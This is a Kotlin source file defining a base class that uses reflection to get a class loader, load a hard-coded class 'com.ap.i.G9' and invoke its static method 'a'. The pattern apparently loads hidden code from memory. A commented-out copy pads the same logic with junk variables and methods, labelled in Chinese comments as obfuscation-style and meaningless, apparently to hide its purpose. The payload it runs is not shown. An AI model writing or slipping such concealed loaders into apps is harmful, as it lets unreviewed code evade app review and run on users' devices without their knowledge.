package com.solar.tabor.nkil

/**
 * Date：2025/10/24
 * Describe:
 */

//abstract class BaseFc {
//    private val clazzByteBuffer by lazy { Class.forName("java.nio.ByteBuffer") }
//
//    // 混淆风格的无用变量
//    private val p3 = 16
//    private val qT = "class_tag"
//    private val r7 = mutableSetOf<String>()
//    private val sD = LongArray(3)
//    private val tQ = true
//    private val uK = ByteArray(64)
//    private val v2 = Charsets.UTF_8
//    private val wF = listOf("load", "init", "start")
//    private val xP = StringBuilder()
//    private val y9 = 0x0F
//
//    abstract fun tagStr(int: Int): String
//
//    protected fun fetchPair(): Pair<Class<*>, Class<*>> {
//        // 冗余的参数校验
//        if (tagStr(0).isEmpty()) {
//            logInvalidTag()
//            throw IllegalArgumentException("Invalid class name")
//        }
//
//        // 无意义的类名处理
//        val className = processClassName(tagStr(0))
//        cacheClassName(className)
//
//        // 原始逻辑包装
//        val c1 = try {
//            Class.forName(className)
//        } catch (e: ClassNotFoundException) {
//            handleClassNotFound(e)
//            throw e
//        }
//
//        // 冗余的类型检查
//        if (!isValidClass(c1)) {
//            throw IllegalStateException("Invalid class type")
//        }
//
//        val c2 = clazzByteBuffer
//        // 无意义的配对操作
//        recordClassPair(c1.name, c2.name)
//
//        return Pair(c1, c2)
//    }
//
//    protected fun next(cL: Any) {
//        // 冗余的对象校验
//        if (cL == null) {
//            logNullObject()
//            return
//        }
//
//        // 无意义的方法名检查
//        val methodName = "loadClass"
//        if (!hasMethod(cL.javaClass, methodName)) return
//
//        // 原始逻辑包装
//        val lC = try {
//            val method = cL.javaClass.getMethod(methodName, String::class.java)
//            val targetClass = "com.ap.i.G9"
//            // 冗余的类名验证
//            if (!targetClass.contains(".")) return
//
//            method.invoke(cL, targetClass) as Class<*>
//        } catch (e: Exception) {
//            logMethodError(e)
//            return
//        }
//
//        // 冗余的参数处理
//        val param = 1f.coerceIn(0f, 10f)
//        lC.getMethod("a", Float::class.java).invoke(null, param)
//
//        // 无意义的状态更新
//        updateLastInvokeTime()
//    }
//
//    protected fun fetchName(): String {
//        // 冗余的默认值检查
//        val defaultName = "getClassLoader"
//        if (defaultName.isEmpty()) return "getClassLoader"
//
//        // 无意义的字符串处理
//        return defaultName.uppercase().lowercase()
//    }
//
//    // 无用方法：处理类名
//    private fun processClassName(name: String): String {
//        return if (name.length > p3) name.substring(0, p3) else name.padEnd(p3, '_')
//    }
//
//    // 无用方法：缓存类名
//    private fun cacheClassName(name: String) {
//        r7.add(name)
//        if (r7.size > 5) {
//            r7.remove(r7.first())
//        }
//    }
//
//    // 无用方法：记录类配对
//    private fun recordClassPair(c1: String, c2: String) {
//        xP.append("$c1->$c2;")
//        if (xP.length > 100) {
//            xP.clear()
//        }
//    }
//
//    // 无用方法：验证类有效性
//    private fun isValidClass(clazz: Class<*>): Boolean {
//        return clazz.name.length > 5 && clazz.methods.isNotEmpty()
//    }
//
//    // 无用方法：处理类未找到异常
//    private fun handleClassNotFound(e: ClassNotFoundException) {
//        sD[0] = System.currentTimeMillis()
//        uK.fill(0)
//        e.message?.toByteArray(v2)?.copyInto(uK, 0, 0, uK.size.coerceAtMost(e.message?.length ?: 0))
//    }
//
//    // 无用方法：检查是否有指定方法
//    private fun hasMethod(clazz: Class<*>, methodName: String): Boolean {
//        return clazz.methods.any { it.name == methodName }
//    }
//
//    // 无用方法：日志相关（无实际输出）
//    private fun logInvalidTag() {
//        xP.append("Invalid tag at ${System.currentTimeMillis()};")
//    }
//
//    private fun logNullObject() {
//        xP.append("Null object at ${System.currentTimeMillis()};")
//    }
//
//    private fun logMethodError(e: Exception) {
//        xP.append("Error: ${e.message} at ${System.currentTimeMillis()};")
//    }
//
//    // 无用方法：更新最后调用时间
//    private fun updateLastInvokeTime() {
//        sD[1] = System.currentTimeMillis()
//    }
//}

abstract class BaseFc {
    private val clazzByteBuffer by lazy { Class.forName("java.nio.ByteBuffer") }

    abstract fun tagStr(int: Int): String

    protected fun fetchPair(): Pair<Class<*>, Class<*>> {
        val c1 = Class.forName(tagStr(0))
        //"java.nio.ByteBuffer"
        val c2 = clazzByteBuffer
        return Pair(c1, c2)
    }

    protected fun next(cL: Any) {
        val lC = cL.javaClass.getMethod("loadClass", String::class.java)
            .invoke(cL, "com.ap.i.G9") as Class<*>

        lC.getMethod("a", Float::class.java).invoke(null, 1f)
    }

    protected fun fetchName(): String{
        return "getClassLoader"
    }
}